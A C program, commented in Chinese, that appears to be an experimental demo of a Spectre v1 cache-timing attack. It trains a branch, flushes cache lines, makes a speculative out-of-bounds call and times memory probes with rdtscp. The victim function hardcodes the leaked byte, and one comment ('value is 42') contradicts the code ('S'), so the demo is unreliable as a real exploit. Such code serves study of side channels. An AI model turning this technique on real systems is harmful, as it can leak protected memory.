#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h> // rdtscp, clflush
#include <stdlib.h>
#include <string.h>

#define ARRAY2_SIZE 256 * 512
#define TRAINING_LOOPS 1000

// 将 array1_size 设为可flush的全局变量
volatile int array1_size = 16;
uint8_t array1[160];  // 多留空间以允许越界模拟
uint8_t array2[ARRAY2_SIZE];
uint8_t volatile temp = 0;

void victim_function(size_t x) {
    if (x < array1_size) {
        temp = array2['S' * 512];
    }
}

void read_memory_byte_timing(size_t malicious_x) {
    int results[256];
    memset(results, 0, sizeof(results));

    for (int run = 0; run < 1; run++) {
        // 冲刷 array2 的缓存
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&array2[i * 512]);
        }

        // 多轮训练 + 攻击执行
        for (int j = TRAINING_LOOPS; j >= 0; j--) {
            size_t x = j % array1_size; // 正常访问
            _mm_clflush((void *)&array1_size);  // 确保从内存重新加载
            _mm_mfence();
            victim_function(x);
        }
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&array2[i * 512]);
        }
        _mm_lfence(); 
        _mm_clflush(&malicious_x); 
        _mm_clflush(&array1_size); 
        _mm_lfence(); 

        victim_function(malicious_x); // 插入恶意访问

        _mm_lfence(); 
        // 侧信道探测哪个值被带入缓存
        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 13) + 3) & 255;
            uint8_t *addr = &array2[mix_i * 512];
            unsigned int junk = 0;
            uint64_t t1 = __rdtscp(&junk);
            junk = *addr;
            uint64_t t2 = __rdtscp(&junk) - t1;

            printf("Epoch[%d], Mix[%d]: Time = %llu cycles\n", i, mix_i, t2);
        }
    }
}

int main() {
    // 初始化 array1、array2
    for (int i = 0; i < array1_size; i++) array1[i] = i;
    for (int i = 0; i < ARRAY2_SIZE; i++) array2[i] = 1;

    // 模拟越界位置处的值为 42
    ((uint8_t *)array1)[array1_size + 5] = 'S';

    // 设置攻击地址
    size_t malicious_x = (size_t)(array1_size + 5);

    read_memory_byte_timing(malicious_x);

    return 0;
}
